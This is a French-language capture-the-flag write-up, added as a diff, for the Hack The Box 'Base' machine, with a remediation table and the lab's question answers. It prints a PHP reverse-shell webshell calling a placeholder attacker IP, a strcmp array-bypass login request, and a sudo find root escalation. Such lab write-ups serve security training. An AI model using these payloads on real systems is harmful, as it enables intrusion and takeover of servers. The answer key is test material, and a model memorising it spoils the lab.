@@ -1,0 +1,269 @@
+---
+title: Base
+description: WU Base
+categories: [Writeup]
+tags: [writeup]
+template: doc
+sidebar:
+  order: 11
+  badge:
+    text: 'easy'
+    variant: success
+---
+
+| OS | Difficulty | Target |
+|----|----|----|
+| Linux | <span style="color:green">**EASY**</span> | 10.129.x.x |
+
+## Résumé
+
+Machine Linux exposant une application web PHP avec un fichier swap `.swp` exposé révélant le code source. La vulnérabilité `strcmp` permet un bypass d'authentification via type juggling. L'upload de fichiers non restreint donne un accès initial. La réutilisation de credentials permet un mouvement latéral vers un utilisateur privilégié.
+
+---
+
+## Reconnaissance
+
+### Scan de ports
+
+```bash
+nmap -T4 <IP>
+```
+
+```shell wrap
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+```
+
+### Scan détaillé
+
+```bash
+nmap -A -p 22,80 <IP>
+```
+
+| Port | Service | Version |
+|------|---------|---------|
+| 22 | SSH | OpenSSH 7.6p1 Ubuntu |
+| 80 | HTTP | Apache 2.4.29 (Ubuntu) |
+
+---
+
+## Enumération
+
+### Directory busting
+
+```bash
+feroxbuster -u http://<IP> -w /path/to/wordlist -t 100
+```
+
+raft-small-directories-lowercase.txt
+
+Répertoires découverts :
+- `/login/` - Page de connexion
+- `/_uploaded/` - Répertoire d'upload
+
+### Fichier swap exposé
+
+En explorant `/login/`, un fichier `.swp` est accessible :
+
+```bash
+curl http://<IP>/login/login.php.swp -o login.php.swp
+strings login.php.swp
+```
+
+Le code source révèle :
+- Utilisation de `strcmp()` pour la validation
+- Inclusion de `config.php` pour les credentials
+- Redirection vers `/upload.php` après authentification
+
+```php
+if (strcmp($username, $_POST['username']) == 0) {
+    if (strcmp($password, $_POST['password']) == 0) {
+        $_SESSION['user_id'] = 1;
+        header("Location: /upload.php");
+```
+
+---
+
+## Exploitation
+
+### Bypass strcmp via Type Juggling
+
+La fonction `strcmp()` comparée avec `== 0` (comparaison faible) est vulnérable.
+
+Si on envoie un **array** au lieu d'une string, `strcmp()` retourne `NULL`, et :
+
+```php
+NULL == 0  // true (type juggling)
+```
+
+#### Exploitation via Burp/Caido
+
+Modifier la requête POST :
+
+```shell wrap
+POST /login/login.php HTTP/1.1
+Host: <IP>
+Content-Type: application/x-www-form-urlencoded
+Cookie: PHPSESSID=<session>
+
+username[]=x&password[]=x
+```
+
+Réponse : `HTTP/1.1 302 Found` → `Location: /upload.php`
+
+### Upload de webshell
+
+Créer un fichier `shell.php` :
+
+```php
+<?php
+$sock=fsockopen("<ATTACKER_IP>",4444);
+$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
+?>
+```
+
+### Reverse shell
+
+```bash
+# Listener
+nc -lvnp 4444
+```
+
+Uploader `shell.php` via `/upload.php`, puis déclencher :
+
+```
+http://<IP>/_uploaded/shell.php
+```
+
+Shell obtenu en tant que `www-data`.
+
+#### Upgrade du shell
+
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+export TERM=xterm
+# Ctrl+Z
+stty raw -echo && fg
+```
+
+---
+
+## Post-exploitation
+
+### Enumération des credentials
+
+```bash
+cat /var/www/html/login/config.php
+```
+
+```php
+<?php
+$username = "admin";
+$password = "**REDACTED**";
+```
+
+### Mouvement latéral
+
+Lister les utilisateurs :
+
+```bash
+cat /etc/passwd | grep bash
+```
+
+```
+root:x:0:0:root:/root:/bin/bash
+john:x:1000:1000:John:/home/john:/bin/bash
+```
+
+Réutilisation du mot de passe :
+
+```bash
+su john
+# Password: **REDACTED**
+```
+
+---
+
+## Escalade de privilèges
+
+### Enumération sudo
+
+```bash
+sudo -l
+```
+
+```shell wrap
+User john may run the following commands on base:
+    (root : root) /usr/bin/find
+```
+
+### Exploitation via GTFOBins
+
+`find` avec sudo permet d'exécuter des commandes arbitraires :
+
+```bash
+sudo find . -exec /bin/sh \; -quit
+```
+
+```
+# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+---
+
+## Flags
+
+```bash
+cat /home/john/user.txt
+cat /root/root.txt
+```
+
+---
+
+## Questions HTB
+
+| # | Question | Réponse |
+|---|----------|---------|
+| 1 | Which two TCP ports are open on the remote host? | `22,80` |
+| 2 | What is the relative path on the webserver for the login page? | `/login/login.php` |
+| 3 | How many files are present in the '/login' directory? | `3` |
+| 4 | What is the file extension of a swap file? | `.swp` |
+| 5 | Which PHP function is being used in the backend code to compare the user submitted username and password to the valid username and password? | `strcmp` |
+| 6 | In which directory are the uploaded files stored? | `_uploaded` |
+| 7 | Which user exists on the remote host with a home directory? | `john` |
+| 8 | What is the password for the user present on the system? | `**REDACTED**` |
+
+---
+
+## A retenir
+
+| Vulnérabilité | Description | Remédiation |
+|---------------|-------------|-------------|
+| **Fichier .swp exposé** | Fichiers temporaires Vim accessibles publiquement | Configurer `.htaccess` pour bloquer les fichiers `.swp`, `.bak`, etc. |
+| **strcmp Type Juggling** | Comparaison faible `== 0` vulnérable aux arrays | Utiliser `=== 0` (comparaison stricte) ou `hash_equals()` |
+| **Upload non restreint** | Pas de validation du type de fichier uploadé | Valider extension, MIME type, et stocker hors du webroot |
+| **Credentials en clair** | Mot de passe stocké en clair dans config.php | Utiliser des variables d'environnement ou un gestionnaire de secrets |
+| **Password reuse** | Même mot de passe pour l'app web et l'utilisateur système | Utiliser des mots de passe uniques par service |
+| **sudo find** | Permet d'exécuter des commandes via `-exec` | Restreindre les binaires sudo, utiliser des alternatives sécurisées |
+
+---
+
+## Outils utilisés
+
+- nmap
+- feroxbuster / ffuf
+- strings
+- Burp Suite / Caido
+- netcat
+
+---
+
+## Références
+
+- [HackTricks - PHP Type Juggling](https://book.hacktricks.xyz/pentesting-web/type-juggling)
+- [OWASP - Type Juggling](https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf)
+- [PayloadsAllTheThings - PHP](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Type%20Juggling)
+- [GTFOBins - find](https://gtfobins.github.io/gtfobins/find/)
+- [RevShells - Reverse Shell Generator](https://www.revshells.com/)
